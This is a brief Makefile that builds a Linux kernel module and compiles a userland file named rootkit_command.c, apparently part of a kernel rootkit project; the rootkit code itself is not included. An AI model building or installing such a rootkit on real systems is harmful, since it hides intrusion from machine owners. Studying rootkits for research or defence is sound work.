KDIR = /lib/modules/$(shell uname -r)/build

all:
	make -C $(KDIR) M=$$PWD
	gcc rootkit_command.c
clean:
	make -C $(KDIR) M=$$PWD clean
